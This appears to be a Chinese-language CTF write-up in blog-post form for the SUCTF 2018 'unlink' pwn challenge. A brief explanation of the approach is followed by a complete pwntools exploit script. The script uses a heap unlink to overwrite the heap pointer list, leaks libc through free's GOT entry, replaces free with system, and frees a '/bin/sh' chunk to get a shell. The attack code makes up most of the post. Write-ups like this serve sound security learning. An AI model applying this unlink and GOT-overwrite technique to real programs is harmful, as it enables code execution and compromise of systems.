@@ -1,0 +1,58 @@
+---
+title: '[SUCTF 2018 招新赛]unlink'
+date: 2024-11-17 18:18 +0800
+categories: [ctf,pwn]
+tags: [unlink]
+---
+> Problem: [[SUCTF 2018 招新赛]unlink](https://www.nssctf.cn/problem/2334)
+
+## 思路
+
+unlink到heap_list修改chunk0的指针指向got_free,修改chunk0的内容，即修改got_free的内容为system，劫持got表getshell
+
+## EXP
+
+```python
+from pwn import *
+context.log_level = 'debug'
+context.terminal = ['tmux','splitw','-h']
+elf = ELF('./service')
+libc = ELF('./libc.so.6')
+io = gdb.debug('./service')
+
+def touch(size):
+    io.sendlineafter(b'please chooice :\n',str(1))
+    io.sendlineafter(b'please input the size : \n',str(size))
+
+def delete(idx):
+    io.sendlineafter(b'please chooice :\n',str(2))
+    io.sendlineafter(b'which node do you want to delete\n',str(idx))
+
+def show(idx):
+    io.sendlineafter(b'please chooice :\n',str(3))
+    io.sendlineafter(b'which node do you want to show\n',str(idx))
+
+def edit(idx,content):
+    io.sendlineafter(b'please chooice :\n',str(4))
+    io.sendlineafter(b'which one do you want modify :\n',str(idx))
+    io.sendafter(b'please input the content\n',content)
+
+touch(0x20)     #0
+touch(0x80)     #1
+touch(0x20)     #2
+heap_list = 0x6020C0
+edit(0,p64(0)+p64(0x21)+p64(heap_list-0x18)+p64(heap_list-0x10)+p64(0x20)+p64(0x90))
+delete(1)
+edit(0,p64(0)*3+p64(elf.got['free']))
+show(0)
+libc_base_addr = u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00')) - libc.sym['free']
+sys_addr = libc_base_addr + libc.sym['system']
+log.info('system => '+hex(sys_addr))
+edit(0,p64(sys_addr))
+edit(2,'/bin/sh\x00')
+delete(2)
+
+io.interactive()
+
+## 总结
+unlink还需要仔细捋清一下逻辑，这道题目还有其他的方法，后续可以尝试一下。
